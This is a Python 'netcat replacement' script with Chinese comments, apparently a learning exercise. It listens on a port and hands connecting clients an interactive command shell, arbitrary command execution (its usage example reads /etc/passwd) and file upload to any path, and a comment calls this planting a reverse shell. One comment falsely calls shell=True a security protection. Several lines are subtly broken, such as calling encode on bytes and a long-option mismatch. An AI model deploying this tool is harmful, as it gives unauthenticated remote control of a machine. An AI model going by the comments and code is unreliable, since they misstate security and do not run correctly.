#! /usr/bin/env python
# -*- coding: utf-8 -*-

import sys
import socket
import getopt
import threading
import subprocess

#全局变量,
listen=False
command=False
upload=False
execute=""
target=""
upload_destination=""
port=0

def usage():
    print("Netcat Replacement...")
    print()
    print("Usage: mynatcat.py -t target_host -p port")
    print("-l --listen                - listen on [host]:[port] for incoming connections")
    print("-e --execute=file_to_run   - execute the given file upon receiving a connection")
    print("-c --command               - initialize a command shell")
    print("-u --upload=destination    - upon receiving connection upload a file and write to [destination]")
    print()
    print()
    print("Examples:")
    print("mynatcat.py -t 192.168.0.1 -p 5555 -l -c")
    print("mynatcat.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe")
    print("mynatcat.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"")
    print("echo 'ABCDEFGHI' | ./mynatcat.py -t 192.168.11.12 -p 135")
    sys.exit(0)

def client_sender(buffer):
    client=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        client.connect((target,port))
        if len(buffer):
            client.send(buffer.encode("utf-8"))
        while True:
            """
            等待数据回传
            """
            recv_len=1
            response=""
            while recv_len:
                data=client.recv(4096).decode("utf-8")
                recv_len=len(data)
                response+=data

                """
                如果数据量较大，超过了4096字节，那么最后一个数据包肯定是不够4096字节的
                若数据量较小，不够4096字节，那么发一个就好了
                """
                if recv_len<4096:
                    break

            print(response)

            """
            等待更多的输入,
            再发出去，
            这是一个交互的过程，不能只收发一次，变成一锤子的买卖
            """
            buffer=input("")
            buffer+="\n"
            client.send(buffer.encode("utf-8"))
    except Exception as err:
        print("[*]Exception! Exiting.")
        print("[*]"+str(err))

    """
    关闭连接
    """
    client.close()

def server_loop():
    global target
    """
    关于python的全局变量，
    如果已经在模块里声明了全局变量，那么在函数中不需要声明就可以引用了，
    但是，要想在函数中修改全局变量的值，则必须在全局变量前加global关键字，
    另外，globals()函数返回值是一个以全局变量名和值为键值段的字典。
    """
    """
    如果没有定义目标，则监听所有端口
    """
    if not len(target):
        target="0.0.0.0"

    server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server.bind((target,port))

    server.listen(5)

    while True:
        client_socket,addr=server.accept()
        """
        每一个线程处理一个新的客户端
        """
        client_thread = threading.Thread(target=client_handler,args=(client_socket,))
        client_thread.start()

def run_command(command):
    """
    运行命令行函数
    :param command:用户输入指令 
    :return: 将命令运行后的输出返回
    """
    """
    将用户输入命令的换行符去掉
    """
    command = command.rstrip()
    """
    运行命令并返回
    使用subprocess.check_output()函数实现，
    运行command定义的命令，并返回一个字符串表示的输出值，
    如果返回码为非零，则抛出 CalledProcessError异常。
    如果要捕捉结果中的标准错误，使用 stderr=subprocess.STDOUT参数，
    表示将标准错误重定向到标准输出的同一个句柄。
    使用 shell=True 是一种安全保护机制，
    这个时候，我们使用一整个字符串，而不是一个表subprocess.call(["ls","-l"])来运行子进程。
    Python将先运行一个shell，再用这个shell来解释这整个字符串。
    """
    try:
        output = subprocess.check_output(command,stderr=subprocess.STDOUT,shell=True)
    except:
        output = "Failed to execute command.\r\n".encode("utf-8")

    return output

def client_handler(client_socket):
    """
    实现文件上传，命令执行和shell相关的功能。
    :param client_socket: 客户端套接字
    :return: null
    """
    global upload
    global execute
    global command

    """
    检测上传文件
    """
    if len(upload_destination):
        """
        读取所有的字符并写下目标
        """
        file_buffer=""
        """
        持续读取数据直到没有符合的数据
        """
        while True:
            data = client_socket.recv(1024).decode("utf-8")

            if not data:
                break
            else:
                file_buffer+=data

        """
        将接收到的数据写出来
        """
        try:
            with open(upload_destination,"wb") as file_descriptor:
                file_descriptor.write(file_buffer)

            """
            确认文件已经写出来了
            """
            client_socket.send(("Sucessfully saved file to %s\r\n"%upload_destination).encode("utf-8"))
        except:
            client_socket.send(("Failed to save file to %s\r\n"%upload_destination).encode("utf-8"))

    """
    检测命令执行
    """
    if len(execute):
        """
        运行命令
        """
        output = run_command(execute)
        client_socket.send(output.encode("utf-8"))

    """
    如果需要一个命令行shell,那么我们进入另一个循环
    """
    if command:
        while True:
            """
            弹出一个窗口
            """
            client_socket.send("<mynatcat:#>".encode("utf-8"))
            """
            接收文件，直到发现换行符
            """
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer+=client_socket.recv(1024).decode("utf-8")
            """
            返还命令输出
            """
            response = run_command(cmd_buffer)

            """
            返回响应数据
            """
            client_socket.send(response)

def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    """
    sys.argv[]，读取命令行参数，
    sys.argv[0]，代表当前代码运行的路径(脚本本身的名字)
    sys.argv[1][2:]，代表从第一个命令的第2个字节截取命令行参数
    """
    if not len(sys.argv[1:]):
        usage()

    """
    读取命令行选项
    sys.argv[1:]，从第一个命令开始读，读到命令行结束
    "hle:t:p:cu:"，短格式（-h）,
    h，l，u后面没有：，表示此命令不需要参数，
    e:t:p:后面有：，表示这些命令需要参数
    """
    try:
        opts,args=getopt.getopt(sys.argv[1:],"hle:t:p:cu:",
                                ["help","listen","execute","target","port","command","upload"])
    except getopt.GetoptError as err:
        print(str(err))
        usage()

    for o,a in opts:
        if o in("-h","--help"):
            usage()
        elif o in ("-l","--listen"):
            listen=True
        elif o in ("-e","--execute"):
            execute=a
        elif o in ("-c","--commandshell"):
            command=True
        elif o in ("-u","--upload"):
            upload_destination=a
        elif o in ("-t","--target"):
            target=a
        elif o in ("-p","--port"):
            port=int(a)
        else:
            assert False,"Unhandle Option"

    """
    不进行监听，仅从标准输入发送数据
    """
    if not listen and len(target) and port>0:
        """
        从命令行读取内存数据
        这里将阻塞，所以不再向标准输入发送数据时发送Ctrl+D
        """
        buffer = sys.stdin.read()

        """
        发送数据
        """
        client_sender(buffer)

    """
    取决于上面命令行选项(如果listen==true,则建立一个监听的套接字)
    并开始监听并准备上传文件、执行命令
    放置一个反弹shell
    """
    if listen:
        server_loop()

if __name__=="__main__":
    main()


